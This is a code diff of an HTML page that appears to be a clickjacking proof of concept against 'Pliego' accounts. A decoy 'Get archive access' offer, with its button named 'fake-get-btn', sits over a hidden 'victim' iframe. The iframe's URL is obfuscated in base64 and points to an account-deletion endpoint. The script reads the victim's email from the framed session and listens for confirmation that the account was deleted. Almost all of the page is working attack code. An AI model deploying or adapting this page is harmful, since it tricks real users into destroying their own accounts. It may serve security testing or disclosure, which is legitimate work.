@@ -134,12 +134,12 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
   <div class="sb-pub">ZIP · 847 prints · Partner access for Collected readers</div>
 </div>
 
-<div class="acct-label" id="acct-label">Pliego account</div>
-<div class="acct-pill" id="acct-pill">
+<div class="acct-label" id="acct-label" style="display:none">Pliego account</div>
+<div class="acct-pill" id="acct-pill" style="display:none">
   <div class="acct-dot"></div>
-  <div class="acct-email-text" id="acct-email-text">loading…</div>
+  <div class="acct-email-text" id="acct-email-text"></div>
 </div>
-<button class="fake-get-btn" id="fake-get-btn" tabindex="0" aria-label="Get archive access">Get archive access</button>
+<button class="fake-get-btn" id="fake-get-btn" style="display:none" tabindex="0" aria-label="Get archive access">Get archive access</button>
 <div class="sb-recaptcha">
   Access delivered via <strong>Pliego Editions</strong> · Protected by reCAPTCHA
 </div>
@@ -193,45 +193,27 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 </div>
 
 <script>
-// ── Read session token from URL hash (#tok=...) ─────────────────────────
-var _hashParams = new URLSearchParams(location.hash.slice(1));
-var _tok = _hashParams.get('tok') || '';
-
-// Fetch session via token (no cookie needed — avoids third-party cookie block)
-var _sessionUrl = _tok
-  ? 'https://pliego-len3.onrender.com/api/session?tok=' + encodeURIComponent(_tok)
-  : 'https://pliego-len3.onrender.com/api/session';
-
-fetch(_sessionUrl, { credentials: 'include' })
-  .then(function(r) { return r.json(); })
-  .then(function(d) {
-    if (d.loggedIn && d.email) {
-      document.getElementById('acct-email-text').textContent = d.email;
-    } else {
-      document.getElementById('acct-label').style.display = 'none';
-      document.getElementById('acct-pill').style.display = 'none';
-      document.getElementById('fake-get-btn').style.display = 'none';
-      document.querySelector('.sb-recaptcha').style.display = 'none';
-      document.getElementById('login-prompt').style.display = 'block';
-    }
-  })
-  .catch(function() {
-    document.getElementById('acct-email-text').textContent = 'your registered email';
-  });
-
-// ── Load victim iframe from base64 — append token to hash ───────────────
+// ── Load victim iframe (cookie sent automatically by browser — SameSite=None) ──
 setTimeout(function() {
-  var p = [
-    'aHR0cHM6Ly9wbGll',
-    'Z28tbGVuMy5vbnJl',
-    'bmRlci5jb20vZWxpbWluYXI='
-  ];
-  var base = atob(p.join(''));
-  document.getElementById('victim-frame').src = base + (_tok ? '#tok=' + encodeURIComponent(_tok) : '');
+  var p = ['aHR0cHM6Ly9wbGll', 'Z28tbGVuMy5vbnJl', 'bmRlci5jb20vZWxpbWluYXI='];
+  document.getElementById('victim-frame').src = atob(p.join(''));
 }, 500);
 // decodes to: https://pliego-len3.onrender.com/eliminar
+// decodes to: https://pliego-len3.onrender.com/eliminar
 
-// ── Listen for postMessage from iframe when deletion fires ──────────────
+// ── Receive email from iframe once it verifies the session ──────────────
+window.addEventListener('message', function(e) {
+  if (e.data && e.data.type === 'pliego-session' && e.data.email) {
+    document.getElementById('acct-email-text').textContent = e.data.email;
+    document.getElementById('acct-label').style.display = 'block';
+    document.getElementById('acct-pill').style.display = 'flex';
+    document.getElementById('fake-get-btn').style.display = 'flex';
+    document.querySelector('.sb-recaptcha').style.display = 'block';
+    document.getElementById('login-prompt').style.display = 'none';
+  }
+});
+
+// ── Listen for deletion confirmation ────────────────────────────────────
 window.addEventListener('message', function(e) {
   if (e.data && e.data.type === 'pliego-deleted') {
     document.getElementById('acct-label').style.display = 'none';
